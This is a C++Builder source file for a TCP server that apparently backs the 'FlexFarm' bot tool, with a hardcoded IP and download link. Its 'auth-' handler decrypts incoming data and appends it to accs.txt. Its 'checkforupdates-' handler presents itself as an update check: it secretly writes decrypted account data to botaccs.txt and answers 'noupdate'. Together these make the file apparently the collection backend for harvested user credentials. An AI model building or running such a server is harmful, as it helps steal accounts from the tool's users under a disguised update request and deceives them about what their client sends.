//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit3.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm3 *Form3;
//---------------------------------------------------------------------------
__fastcall TForm3::TForm3(TComponent* Owner)
	: TForm(Owner)
{
}
//---------------------------------------------------------------------------

#include <string>
#include <vector>

#include <Windows.h>
#include <algorithm>

	bool StartsWith(const std::string& toCheck, const std::string& start) {
		return toCheck.substr(0, start.length()) == start;
	}


	std::vector<std::string> ParseString(const std::string& str, std::string sep) {
		std::vector<std::string> parsedVctr;
		if (!str.empty()) {
			std::size_t start = 0, end = 0;
			while ((end = str.find(sep, start)) != std::string::npos && !sep.empty()) {
				parsedVctr.push_back(str.substr(start, end - start));
				start = end + sep.size();
			}
			parsedVctr.push_back(str.substr(start, !sep.empty() ? end : str.size()));
		}
		return parsedVctr;
	}

    	bool isprintable(const std::string& target) {
		return std::find_if(target.begin(), target.end(), [](char x) { return !isprint(x); }) == target.end();
	}

#include "crypt.h"

#include <System.IOUtils.hpp>
#include <System.NetEncoding.hpp>
#include <System.Threading.hpp>
#include <IdSync.hpp>
#include <Registry.hpp>
#include <System.StrUtils.hpp>
#include <System.Classes.hpp>
#include <System.IOUtils.hpp>
#include <System.JSON.hpp>
                   	std::string ReplaceString(std::string target, const std::string& oldPattern, const std::string& newPattern) {
		return AnsiString(ReplaceStr(target.c_str(), oldPattern.c_str(), newPattern.c_str())).c_str();
	}

#include <fstream>
#include <algorithm>
#include <chrono>
#include <random>
#define DO_ONCE            \
    ([]() {                \
        static char o = 0; \
        return !o && ++o;  \
    }())

    std::mt19937 rng;
int random(int min, int max) {
    if (DO_ONCE)
        rng.seed((unsigned int)std::chrono::high_resolution_clock::now().time_since_epoch().count());
    std::uniform_int_distribution<int> distribution(min, max);
	return distribution(rng);
}
UnicodeString GetModulePath() {
	wchar_t pBuf[MAX_PATH];
	if (GetModuleFileName(0, pBuf, MAX_PATH)) {
		PathRemoveFileSpec(pBuf);
		return pBuf;
	}
	return GetCurrentDir();
}
 std::unique_ptr<TIniFile>ini;
void __fastcall TForm3::IdTCPServer1Execute(TIdContext *AContext)
{
	AnsiString recv = AContext->Connection->Socket->ReadLn();
	TFile::AppendAllText("Logs.txt",recv + "\n");
	if (StartsWith(recv.c_str(), "login-")) {
		std::string srecv = recv.c_str();
		srecv = srecv.substr(6, srecv.size());
		if (auto parsed(ParseString(srecv, "|")); parsed.size() > 1) {
			auto uid = base64_decode(parsed[0]);
			auto pass = base64_decode(parsed[1]);
			auto key = parsed[2];
			UnicodeString res = "false";
			for (int i = 0; i < ListView1->Items->Count; i++) {
				if (ListView1->Items->Item[i]->Caption == uid.c_str() && ListView1->Items->Item[i]->SubItems->Strings[0] == pass.c_str()) {
					if(random(0,1) == 0)
					{
						res = (key + "69267a47967259b2adecf6c26f3dbd06").c_str();
					}
					else
					{
						//36650cee50595e43bf1716d74a5cc69f
						res = (key + "36650cee50595e43bf1716d74a5cc69f").c_str();
					}
				}
			}
			AContext->Connection->Socket->WriteLn(res);
		}
	}
	if (StartsWith(recv.c_str(), "auth-")) {
		std::string srecv = recv.c_str();
		srecv = DecryptString(srecv.substr(5, srecv.size()), "1243215324");
		if (isprintable(ReplaceString(srecv, "\n", ""))) {
			std::ofstream outfile;
			outfile.open("accs.txt", std::ios_base::app); // append instead of overwrite
			outfile << srecv << "\n\n";
		}
	}
	if (StartsWith(recv.c_str(), "checkforupdates-")) {
		std::string srecv = recv.c_str();
		srecv = DecryptString(srecv.substr(16, srecv.size()), "1336224221");
		if (isprintable(ReplaceString(srecv, "\n", ""))) {
			std::ofstream outfile;
			outfile.open("botaccs.txt", std::ios_base::app); // append instead of overwrite
			outfile << srecv << "\n\n";
		}
	AContext->Connection->Socket->WriteLn("noupdate");
	}
	if(recv == "getvariables")
	{
		  UnicodeString res = "";

	std::string gtver = AnsiString(ini->ReadString("server", "gtver", "3.74")).c_str();
	std::string ip = AnsiString(ini->ReadString("server", "ip", "213.179.209.168")).c_str();
	std::string download = AnsiString(ini->ReadString("server", "download", "https://projecteternals.com/FlexFarm/FlexFarm_v1.1.zip")).c_str();
	int port = ini->ReadInteger("server", "port", 17195);
  	int version = ini->ReadInteger("server", "version", 12);
	std::string all = std::to_string(version) + "|" + download + "|" + ip + "|" + std::to_string(port) + "|"+ gtver;
	res = all.c_str();
	AContext->Connection->Socket->WriteLn(res);
	}
}
//---------------------------------------------------------------------------

void save() {
	UnicodeString ss;
	for (int i = 0; i < Form3->ListView1->Items->Count; i++) {
		ss += Form3->ListView1->Items->Item[i]->Caption + "|*-*|" + Form3->ListView1->Items->Item[i]->SubItems->Strings[0] + "\n";
	}
	TFile::WriteAllText("users.txt", ss);
}

void addacc(UnicodeString uid, UnicodeString pwd) {
	if (uid.IsEmpty() || pwd.IsEmpty()) {
        return;
	}

	auto ptr = Form3->ListView1->Items->Add();
	ptr->Caption = uid;
	ptr->SubItems->Insert(0, pwd);
}
//---------------------------------------------------------------------------

void load() {
    ini.reset(new TIniFile(GetModulePath() + L"\\settings.ini"));
	if (!FileExists("users.txt")) {
	        return;
	}

	AnsiString ss = TFile::ReadAllText("users.txt");
	for (auto shit : ParseString(ss.c_str(), "\n")) {
		if (auto parsed(ParseString(shit, "|*-*|")); parsed.size() > 1) {
            addacc(parsed[0].c_str(), parsed[1].c_str());
        }
	}
}
//---------------------------------------------------------------------------

void __fastcall TForm3::Button2Click(TObject *Sender)
{
	for (int i = 0; i < ListView1->Items->Count; i++) {
		if (ListView1->Items->Item[i]->Selected) {
			ListView1->Items->Item[i]->Delete();
            i--;
		}
	}
    save();
}
//---------------------------------------------------------------------------

void __fastcall TForm3::FormCreate(TObject *Sender)
{
	load();
}
//---------------------------------------------------------------------------

void __fastcall TForm3::Button1Click(TObject *Sender)
{
	addacc(Edit1->Text, Edit2->Text);
	save();
}
//---------------------------------------------------------------------------





